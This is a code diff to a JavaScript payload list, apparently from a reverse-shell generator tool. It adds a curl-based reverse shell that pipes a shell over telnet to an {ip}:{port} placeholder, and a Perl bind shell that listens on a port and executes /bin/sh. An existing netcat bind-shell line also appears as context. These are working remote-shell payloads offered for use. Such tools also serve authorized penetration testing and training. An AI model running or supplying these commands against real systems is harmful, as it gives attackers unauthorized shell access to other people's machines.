@@ -87,6 +87,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
+            "name": "curl",
+            "command": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
+            "meta": ["linux", "mac"]
+        },
+        {
             "name": "rustcat",
             "command": "rcat connect -s {shell} {ip} {port}",
             "meta": ["linux", "mac"]
@@ -396,6 +401,11 @@ const bindShellCommands =  withCommandType(
         {
             "name": "nc Bind",
             "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
+            "meta": ["bind", "mac", "linux"]
+        },
+        {
+            "name": "Perl Bind",
+            "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
             "meta": ["bind", "mac", "linux"]
         },
     ]
